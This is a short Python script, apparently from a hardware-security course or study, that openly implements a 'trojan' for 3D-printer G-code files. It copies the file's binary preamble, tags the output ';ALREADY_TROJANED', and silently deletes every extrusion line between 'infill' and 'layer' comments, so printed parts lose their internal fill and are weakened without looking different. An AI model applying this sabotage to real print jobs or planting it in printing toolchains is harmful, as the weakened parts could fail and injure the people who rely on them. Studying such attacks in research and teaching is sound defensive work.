#this code was written by Hammond Pearce

import re
import random

def run_trojan(infilename, outfilename):

    # all examples run in the middle 75%
    # blob means it will deposit a blob at the end location before moving on, false means it will extrude the extra on the next extrusion

    fi = open(infilename, "rb")

    enabled = False
    skip = False
    count = 0

    #search the file for b';machine_type: Finder' and save everything before it to "binary_preamble"
    binary_preamble = b''
    for line in fi:
        if line.startswith(b';machine_type: Finder'):
            break
        binary_preamble += line

    fi.close()
    #for everything after the binary preamble, convert it to a string
    fi = open(infilename, "r")
    fi.seek(len(binary_preamble))
    lines = fi.readlines()
    fi.close()

    #write the binary preamble to the new file
    fo = open(outfilename, "wb+")
    fo.write(binary_preamble)
    fo.close()

    rex = re.compile("G1 (F[0-9.]+)? ?X([0-9.]+) Y([0-9.]+) E([0-9.]+)\n")

    num_lines = len(lines)

    fo = open(outfilename, "a")
    fo.write(";ALREADY_TROJANED\n")

    #My trojan will scan through the g-code line by line.
    #If it sees a comment saying "infill", it will suppress the lines until it sees a comment
    #saying "layer" again. It will then resume the output.
    skip = False
    for i in range(len(lines)):
        line = lines[i]

        #we are looping through the g-code line by line
        #make some decision logic about whether to edit or include each line
        
        if "infill" in line:
            skip = True
        if "layer" in line:
            skip = False

        if skip == False:
            fo.write(line)

    fo.close()
    print("I HAVE TROJANED " + outfilename)
